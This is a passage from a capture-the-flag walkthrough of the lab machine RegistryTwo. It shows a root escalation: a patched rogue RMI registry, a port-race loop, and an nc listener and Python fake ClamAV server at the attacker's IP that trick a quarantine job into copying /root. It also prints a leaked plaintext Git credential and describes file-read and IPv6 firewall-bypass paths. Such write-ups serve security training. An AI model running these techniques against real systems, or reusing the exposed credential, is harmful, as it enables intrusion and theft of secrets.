The default configuration is to quarantine to `/root/quarantine`, scan `/sites`, and talk to ClamAV on `localhost:3310` with a one second timeout.

### Exploitation

#### Strategy

Every three minutes, the registry server reloads. That means it stops listening on 9002 and then restarts listening on 9002. That means if I can start my own rogue registry service in that window, I can take over the registry service.

Every minute, the quarantine process is going to load a configuration from the RMI registry. It then scans a folder, connects to a ClamAV server, and based on the response, may copy the scanned file to a quarantine folder. The scanned folder, IP and port of the ClamAV server, and quarantine folder are are specified in the configuration from the registry.

I’m going to have a rogue registry server return a configuration that scans `/root`, contacts me as the ClamAV server, and quarantines to a folder I can read, giving me a full copy of `/root`.

#### Rogue Registry Server

I’ll open `registry.jar` in [Recaf](https://github.com/Col-E/Recaf), a very neat tool that can edit Jar files. The class I need to modify is `QuarantineServiceImpl` where it generates the `QuarantineConfiguration` object:

![image-20240131095640133](/img/image-20240131095640133.png)

The arguments for the object are directory to quarantine to, directory to scan, clam host, clam port, and timeout. I’ll update that line to:

```

private static final QuarantineConfiguration DEFAULT_CONFIG = new QuarantineConfiguration(new File("/dev/shm"), new File("/root/"), "10.10.14.6", 3310, 1000);

```

I’ll export the new JAR as `registry-0xdf.jar`.

#### Lazy nc Approach

The simplest way to root this box is just to use `nc` as the ClamAV server. I don’t think this was supposed to work, but it does.

I’ll upload `registry-0xdf.jar` to RegistryTwo. Running it will almost certainly cause a `BindException`:

```

developer@registry:/dev/shm$ java -jar registry-0xdf.jar 
Exception in thread "main" java.rmi.server.ExportException: Port already in use: 9002; nested exception is: 
        java.net.BindException: Address already in use
        at java.rmi/sun.rmi.transport.tcp.TCPTransport.listen(TCPTransport.java:346)
        at java.rmi/sun.rmi.transport.tcp.TCPTransport.exportObject(TCPTransport.java:243)
        at java.rmi/sun.rmi.transport.tcp.TCPEndpoint.exportObject(TCPEndpoint.java:415)
        at java.rmi/sun.rmi.transport.LiveRef.exportObject(LiveRef.java:147)
        at java.rmi/sun.rmi.server.UnicastServerRef.exportObject(UnicastServerRef.java:235)
        at java.rmi/sun.rmi.registry.RegistryImpl.setup(RegistryImpl.java:223)
        at java.rmi/sun.rmi.registry.RegistryImpl.<init>(RegistryImpl.java:208)
        at java.rmi/java.rmi.registry.LocateRegistry.createRegistry(LocateRegistry.java:203)
        at com.htb.hosting.rmi.Server.main(Server.java:15)
Caused by: java.net.BindException: Address already in use
        at java.base/sun.nio.ch.Net.bind0(Native Method)
        at java.base/sun.nio.ch.Net.bind(Net.java:555)
        at java.base/sun.nio.ch.Net.bind(Net.java:544)
        at java.base/sun.nio.ch.NioSocketImpl.bind(NioSocketImpl.java:643)
        at java.base/java.net.ServerSocket.bind(ServerSocket.java:388)
        at java.base/java.net.ServerSocket.<init>(ServerSocket.java:274)
        at java.base/java.net.ServerSocket.<init>(ServerSocket.java:167)
        at java.rmi/sun.rmi.transport.tcp.TCPDirectSocketFactory.createServerSocket(TCPDirectSocketFactory.java:45)
        at java.rmi/sun.rmi.transport.tcp.TCPEndpoint.newServerSocket(TCPEndpoint.java:673)
        at java.rmi/sun.rmi.transport.tcp.TCPTransport.listen(TCPTransport.java:335)
        ... 8 more

```

That’s because the real registry is already bound on 9002. I’ll use this loop to constantly start my registry until it works:

```

while ! java -jar registry-0xdf.jar 2>/dev/null; do printf "\r%s" "$(date)"; done

```

It will try to run the registry and if it works, exit the loop. Otherwise, it prints the date on the screen so I can watch the time increase towards a minute divisible by three:

![](/img/RegistryTwo-bind.gif)

Once the service resets, my rogue registry grabs the port and the real one will fail, typically one second after the reset. Now the next minute when the scan starts, I’ll start getting connections to my `nc`, which I run with `nc -lnvkp 3310`. The `-k` allows that single listener to get multiple connections.

```

oxdf@hacky$ nc -lvnkp 3310
Listening on 0.0.0.0 3310
Connection received on 10.10.11.223 35118
zSCAN /root/.docker/buildx/.lockConnection received on 10.10.11.223 35126
zSCAN /root/.docker/buildx/currentConnection received on 10.10.11.223 35136
zSCAN /root/.docker/.buildNodeIDConnection received on 10.10.11.223 35148
zSCAN /root/.docker/.token_seed.lockConnection received on 10.10.11.223 35152
zSCAN /root/.docker/config.jsonConnection received on 10.10.11.223 35160
zSCAN /root/.docker/.token_seedConnection received on 10.10.11.223 35176
zSCAN /root/.lesshstConnection received on 10.10.11.223 35188
...[snip]...

```

This moves really slowly. The `nc` connection hangs open until the client times out, and then it moves to the next file, and there are a lot of files. I don’t believe this was supposed to work, but it does - the files are quarantined:

```

developer@registry:/dev/shm$ ls
quarantine-run-2024-01-31T15:38:27.565107283  quarantine-run-2024-01-31T15:38:34.993189226  quarantine-run-2024-01-31T15:38:42.548797705
quarantine-run-2024-01-31T15:38:27.753866048  quarantine-run-2024-01-31T15:38:35.188953456  quarantine-run-2024-01-31T15:38:42.741363684
quarantine-run-2024-01-31T15:38:27.940511288  quarantine-run-2024-01-31T15:38:35.389759415  quarantine-run-2024-01-31T15:38:42.935289133
quarantine-run-2024-01-31T15:38:28.126540311  quarantine-run-2024-01-31T15:38:35.576085425  quarantine-run-2024-01-31T15:38:43.122035242
quarantine-run-2024-01-31T15:38:28.314376014  quarantine-run-2024-01-31T15:38:35.775290591  quarantine-run-2024-01-31T15:38:43.315574126
quarantine-run-2024-01-31T15:38:28.504268527  quarantine-run-2024-01-31T15:38:35.965004668  quarantine-run-2024-01-31T15:38:43.502664140
quarantine-run-2024-01-31T15:38:28.691709279  quarantine-run-2024-01-31T15:38:36.159227375  quarantine-run-2024-01-31T15:38:43.694310373
quarantine-run-2024-01-31T15:38:28.887762591  quarantine-run-2024-01-31T15:38:36.362928867  quarantine-run-2024-01-31T15:38:43.885759506
quarantine-run-2024-01-31T15:38:29.076483425  quarantine-run-2024-01-31T15:38:36.554182383  quarantine-run-2024-01-31T15:38:44.074739135
quarantine-run-2024-01-31T15:38:29.264766277  quarantine-run-2024-01-31T15:38:36.741290581  quarantine-run-2024-01-31T15:38:44.266947883
quarantine-run-2024-01-31T15:38:29.453268150  quarantine-run-2024-01-31T15:38:36.936020630  quarantine-run-2024-01-31T15:38:44.458115378
quarantine-run-2024-01-31T15:38:29.641858258  quarantine-run-2024-01-31T15:38:37.122417804  quarantine-run-2024-01-31T15:38:44.648628815
quarantine-run-2024-01-31T15:38:29.829106289  quarantine-run-2024-01-31T15:38:37.311152715  quarantine-run-2024-01-31T15:38:44.836004996
quarantine-run-2024-01-31T15:38:30.016599820  quarantine-run-2024-01-31T15:38:37.499389190  quarantine-run-2024-01-31T15:38:45.024569737
quarantine-run-2024-01-31T15:38:30.203721293  quarantine-run-2024-01-31T15:38:37.710029230  quarantine-run-2024-01-31T15:38:45.213802842
quarantine-run-2024-01-31T15:38:30.391650472  quarantine-run-2024-01-31T15:38:37.896403742  quarantine-run-2024-01-31T15:38:45.401849461
quarantine-run-2024-01-31T15:38:30.581197496  quarantine-run-2024-01-31T15:38:38.086732813  quarantine-run-2024-01-31T15:38:45.590774148
quarantine-run-2024-01-31T15:38:30.770517324  quarantine-run-2024-01-31T15:38:38.303797569  quarantine-run-2024-01-31T15:38:45.779301809
quarantine-run-2024-01-31T15:38:30.957946925  quarantine-run-2024-01-31T15:38:38.493119240  quarantine-run-2024-01-31T15:38:45.968093266
quarantine-run-2024-01-31T15:38:31.146062714  quarantine-run-2024-01-31T15:38:38.682914640  quarantine-run-2024-01-31T15:38:46.162644259
quarantine-run-2024-01-31T15:38:31.334928059  quarantine-run-2024-01-31T15:38:38.870295600  quarantine-run-2024-01-31T15:38:46.354489114
quarantine-run-2024-01-31T15:38:31.548550375  quarantine-run-2024-01-31T15:38:39.080112426  quarantine-run-2024-01-31T15:38:46.542343883
quarantine-run-2024-01-31T15:38:31.737135925  quarantine-run-2024-01-31T15:38:39.270579486  quarantine-run-2024-01-31T15:38:46.733970269
quarantine-run-2024-01-31T15:38:31.937834242  quarantine-run-2024-01-31T15:38:39.495741695  quarantine-run-2024-01-31T15:38:46.921844354
quarantine-run-2024-01-31T15:38:32.137803952  quarantine-run-2024-01-31T15:38:39.687413335  quarantine-run-2024-01-31T15:38:47.108012117
quarantine-run-2024-01-31T15:38:32.327866453  quarantine-run-2024-01-31T15:38:39.876715309  quarantine-run-2024-01-31T15:38:47.294763005
quarantine-run-2024-01-31T15:38:32.518394137  quarantine-run-2024-01-31T15:38:40.071941148  quarantine-run-2024-01-31T15:38:47.495398054
quarantine-run-2024-01-31T15:38:32.709811641  quarantine-run-2024-01-31T15:38:40.269791362  quarantine-run-2024-01-31T15:38:47.683618809
quarantine-run-2024-01-31T15:38:32.899408258  quarantine-run-2024-01-31T15:38:40.459516891  quarantine-run-2024-01-31T15:38:47.872446794
quarantine-run-2024-01-31T15:38:33.086934170  quarantine-run-2024-01-31T15:38:40.647931731  quarantine-run-2024-01-31T15:38:48.063708616
quarantine-run-2024-01-31T15:38:33.273078941  quarantine-run-2024-01-31T15:38:40.850089917  quarantine-run-2024-01-31T15:38:48.253123362
quarantine-run-2024-01-31T15:38:33.461460137  quarantine-run-2024-01-31T15:38:41.041608981  quarantine-run-2024-01-31T15:38:48.443913668
quarantine-run-2024-01-31T15:38:33.654801200  quarantine-run-2024-01-31T15:38:41.233143634  quarantine-run-2024-01-31T15:38:48.634081938
quarantine-run-2024-01-31T15:38:33.844774554  quarantine-run-2024-01-31T15:38:41.422876948  quarantine-run-2024-01-31T15:38:48.843981690
quarantine-run-2024-01-31T15:38:34.038609373  quarantine-run-2024-01-31T15:38:41.610882780  quarantine-run-2024-01-31T15:38:49.067259362
quarantine-run-2024-01-31T15:38:34.228551028  quarantine-run-2024-01-31T15:38:41.798567340  quarantine-run-2024-01-31T15:38:49.284299160
quarantine-run-2024-01-31T15:38:34.415150020  quarantine-run-2024-01-31T15:38:41.987391758  registry-0xdf.jar
quarantine-run-2024-01-31T15:38:34.616711968  quarantine-run-2024-01-31T15:38:42.173566725
quarantine-run-2024-01-31T15:38:34.804033717  quarantine-run-2024-01-31T15:38:42.361324793

```

Each directory has a file in it:

```

developer@registry:/dev/shm$ ls quarantine-run-2024-01-31T15\:38\:49.284299160/
_root_iptables.sh

```

Including one with creds for Git just like developer:

```

developer@registry:/dev/shm$ cat ./quarantine-run-2024-01-31T15:38:30.581197496/_root_.git-credentials
https://admin:52nWqz3tejiImlbsihtV@github.com

```

#### Python Clam Server

Making a Python socket server that will respond appropriately is a bit trickier. I need to understand the message that should come back in the response. The response is handled in `ClamScan` in the `scanFile` function, and passed into the constructor of a `ScanResult` object. It gets handled here:

```

    public void setResult(String result) {
        this.result = result;
        if (result == null) {
            this.setStatus(Status.ERROR);
        } else if (result.contains(RESPONSE_OK)) {
            this.setStatus(Status.PASSED);
        } else if (result.endsWith(FOUND_SUFFIX)) {
            this.setSignature(result.substring(STREAM_PREFIX.length(), result.lastIndexOf(FOUND_SUFFIX) - 1));
        } else if (result.endsWith(ERROR_SUFFIX)) {
            this.setStatus(Status.ERROR);
        }
    }

```

To get quarantined, I need the result to end with `FOUND_SUFFIX` so it doesn’t change the `status`, which is initialized to `FAILED` earlier. `FOUND_SUFFIX` is just “FOUND”. It also has to be long enough, as it has to do a substring starting after the length of “stream: “.

With that in mind, and with a bit of help from ChatGPT, I’ll quickly create this Python server:

```

import socket
import threading

def handle_client(client_socket):
    data = client_socket.recv(4096).decode('utf-8')
    print(data)
    client_socket.send(f"stream: 0xdf FOUND".encode('utf-8'))
    client_socket.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 3310))
    server.listen(5)
    print("[*] Listening on port 3310")

    try:
        while True:
            client, address = server.accept()
            print("[*] Accepted connection from: {}:{}".format(address[0], address[1]))
            client_handler = threading.Thread(target=handle_client, args=(client,))
            client_handler.start()
    except KeyboardInterrupt:
        print("\n[*] Exiting...")
        server.close()

if __name__ == "__main__":
    main()

```

This handles all of `/root` in ~20-25 seconds, where as the `nc` approach took over two minutes.

### su

root is not allowed to SSH with password, but those creds work with `su` to get a root shell:

```

developer@registry:/dev/shm$ su -
Password: 
root@registry:~#

```

And the root flag:

```

root@registry:~# cat root.txt
9f2dc423************************

```

## Beyond Root

### Unintended Paths

#### Overview

There are a few neat unintended paths that I’m aware of for RegistryTwo:

```

flowchart TD;
    A[Enumeration]--Docker Registry-->B(hosting-app Image);
    B--/..;/ and\nSessions Manipulation-->C(Admin Access);
    C-->D(RMI Deserialization);
    D-->E[Shell as app in Container];
    E-->F(File Read on Host via RMI);
    F-->G[Shell as Developer];
    E-. ifconfig .->H(Find IPv6);
    H-->F;
    A--/..;/ and\nSessions File Read-->B;
    B--/..;/ and\nSessions File Read-->H;
    B--Shared Lab\nEnumeration-->H;
    subgraph Legend
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px; 
      start3[ ] --->|TheATeam| stop3[ ]
      style start3 height:0px;
      style stop3 height:0px; 
    end

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 0,1,2,3,4,5,11 stroke-width:2px,stroke:#4B9CD3,fill:none;
linkStyle 6,13 stroke-width:2px,stroke:#FFFF99,fill:none,stroke-dasharray:3;
style Legend fill:#1d1d1d,color:#FFF;

```

#### File Read Unintended

It’s possible to skip the entire Docker Registry enumeration using the File Read from the Sessions Example page. Enumeration already suggested this was a Java Web application, but by setting the editing file to `/proc/self/cmdline`, it affirms that it is Tomcat:

![image-20240131152442920](/img/image-20240131152442920.png)

The page source shows that the data is loaded as a base64 blob and then decoded onto the page:

![image-20240131152642653](/img/image-20240131152642653.png)

I’ll use that blog plus `base64 -d` and `tr '\0' ' '` to decode this into a readable command line:

```

oxdf@hacky$ echo "L3Vzci9saWIvanZtL2phdmEtMS44LW9wZW5qZGsvanJlL2Jpbi9qYXZhAC1EamF2YS51dGlsLmxvZ2dpbmcuY29uZmlnLmZpbGU9L3Vzci9sb2NhbC90b21jYXQvY29uZi9sb2dnaW5nLnByb3BlcnRpZXMALURqYXZhLnV0aWwubG9nZ2luZy5tYW5hZ2VyPW9yZy5hcGFjaGUuanVsaS5DbGFzc0xvYWRlckxvZ01hbmFnZXIALURqZGsudGxzLmVwaGVtZXJhbERIS2V5U2l6ZT0yMDQ4AC1EamF2YS5wcm90b2NvbC5oYW5kbGVyLnBrZ3M9b3JnLmFwYWNoZS5jYXRhbGluYS53ZWJyZXNvdXJjZXMALURpZ25vcmUuZW5kb3JzZWQuZGlycz0ALWNsYXNzcGF0aAAvdXNyL2xvY2FsL3RvbWNhdC9iaW4vYm9vdHN0cmFwLmphcjovdXNyL2xvY2FsL3RvbWNhdC9iaW4vdG9tY2F0LWp1bGkuamFyAC1EY2F0YWxpbmEuYmFzZT0vdXNyL2xvY2FsL3RvbWNhdAAtRGNhdGFsaW5hLmhvbWU9L3Vzci9sb2NhbC90b21jYXQALURqYXZhLmlvLnRtcGRpcj0vdXNyL2xvY2FsL3RvbWNhdC90ZW1wAG9yZy5hcGFjaGUuY2F0YWxpbmEuc3RhcnR1cC5Cb290c3RyYXAAc3RhcnQA" | base64 -d | tr '\0' ' '
/usr/lib/jvm/java-1.8-openjdk/jre/bin/java -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dignore.endorsed.dirs= -classpath /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/usr/local/tomcat -Dcatalina.home=/usr/local/tomcat -Djava.io.tmpdir=/usr/local/tomcat/temp org.apache.catalina.startup.Bootstrap start

```

Tomcat logs are stored in the Tomcat home directory + `/logs` as `catalina.[YYYY]-[MM]-[DD].log`. I’ll read the log for today looking for when the server started. There’s this line:

```

26-Jan-2024 20:49:55.389 INFO [main] org.apache.catalina.startup.HostConfig.deployWAR Deploying web application archive [/usr/local/tomcat/webapps/hosting.war]

```

Updating the session variable one last time to the `hosting.war` path, the viewer is ugly:

![image-20240131153620213](/img/image-20240131153620213.png)

But it is a PK = Zip (or War) file. I’ll grab the base64 blob from the source (it takes a while to load entirely) and decode it into the WAR.

#### IPv6 Unintended

I noticed above that 9002 was listening on IPv6, and that it was listening on all interfaces. In theory, I could connect directly to it from my host, but there’s an IPtables rule blocking that. The script that sets this is `/root/iptables.sh`:

```

#! /bin/bash
iptables -A INPUT -p tcp -m tcp --dport 22 -j ACCEPT -i enp0s8
iptables -A INPUT -p tcp -m tcp --dport 443 -j ACCEPT -i enp0s8
iptables -A INPUT -p tcp -m tcp --dport 5000 -j ACCEPT -i enp0s8
iptables -A INPUT -p tcp -m tcp --dport 5001 -j ACCEPT -i enp0s8

iptables -A INPUT -j DROP -i enp0s8

```

However, the IPv6 rules are not put in place. I’ll set the IP for `registry.webhosting.htb` to the IPv6 of the host in my local `hosts` file:

```

dead:beef::250:56ff:feb9:a1e9 registry.webhosting.htb
10.10.11.223 www.webhosting.htb webhosting.htb

```

Then on IPv6, I’m able to talk directly to a lot more ports:

```

oxdf@hacky$ nmap -6 -p- --min-rate 10000 registry.webhosting.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-30 04:06 EST
Warning: dead:beef::250:56ff:feb9:a1e9 giving up on port because retransmission cap hit (10).
Nmap scan report for registry.webhosting.htb (dead:beef::250:56ff:feb9:a1e9)
Host is up (0.11s latency).
Not shown: 61226 closed ports, 4299 filtered ports
PORT      STATE SERVICE
22/tcp    open  ssh
443/tcp   open  https
3306/tcp  open  mysql
3310/tcp  open  dyna-access
5000/tcp  open  upnp
5001/tcp  open  commplex-link
8009/tcp  open  ajp13
8080/tcp  open  http-proxy
9002/tcp  open  dynamid
37549/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 19.69 seconds

```

When jkr and TheATeam got root blood on RegistryTwo, they actually noticed after having a foothold on the box before getting root, and used it to make development of the RMI client easier avoiding having to upload a JAR each time to get the program working. However, it is possible to shortcut the entire foothold using this if I can leak the IPv6 of the host.

There are nice methods for enumerating IPv6 addresses of other hosts on the same network that work in shared HTB labs. Ippsec has a [great primer on this](https://www.youtube.com/watch?v=1UGxjqTnuyo&t=330s) that I won’t recreate here. I will show how to do it via the Sessions Example file read.

#### Leak IPv6 via Sessions Example

I showed [above](#file-read) how I could use the Sessions Example page to set the file that loads in the editor to whatever page I want. I’ll set it to `/proc/net/if_inet6`:

![image-20240131131037442](/img/image-20240131131037442.png)

On refreshing the editor, I get the file:

![image-20240131131055475](/img/image-20240131131055475.png)

I can grab the one for `eth0` and work with it there.

### nginx Setup

The website allows uses to create “domains” which it then handles as virtual hosts. I’ve already looked at the `/sites` directory. Each “domain” has a folder, including `www`:

```

root@registry:/sites# ls
www.static-482f6175cb85.webhosting.htb  www.static-68d01707c93f.webhosting.htb  www.static-e492442a4be9.webhosting.htb
www.static-5403e43655a0.webhosting.htb  www.static-950ba61ab119.webhosting.htb  www.static-e511acc71eed.webhosting.htb
www.static-5762637d572b.webhosting.htb  www.static-c0a4a2cfd9ce.webhosting.htb  www.static-f7200b8c1225.webhosting.htb
www.static-5a9d1f63c28c.webhosting.htb  www.static-dd1305ddf270.webhosting.htb  www.webhosting.htb

```

The nginx config is in `/etc/nginx/sites-enabled/default`:

```

server {
        listen 443 ssl;
        listen [::]:443 ssl;
        include snippets/self-signed.conf;
        include snippets/ssl-params.conf;
        if (!-d /sites/$http_host) {
                rewrite . https://www.webhosting.htb/ redirect;
        }
        root /sites/$http_host;

        server_name $http_host;
        index index.html index.htm index.nginx-debian.html;
        server_name _;
        location / {
                try_files $uri $uri/ =404;
        }
        location /hosting/ {
                proxy_set_header X-Forwarded-Host $host;
                proxy_set_header X-Forwarded-Server $host;
                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_pass http://127.0.0.1:8080/hosting/;
        }
}

```

This is a neat nginx config. `$http_host` is the value in the `Host` HTTP header. If the `(!-d /sites/$http_host)` checks if a folder exists for that host, and if not, it returns a redirect to `www.webhosting.htb`. Then it sets the HTTP root to `/sites/$http_host`. It’s quite simply, but still very clever.

For anything in the `/hosting/` directory, it is forwarding it to `127.0.0.1:8080`, which is actually another docker container that runs the `hosting-app`.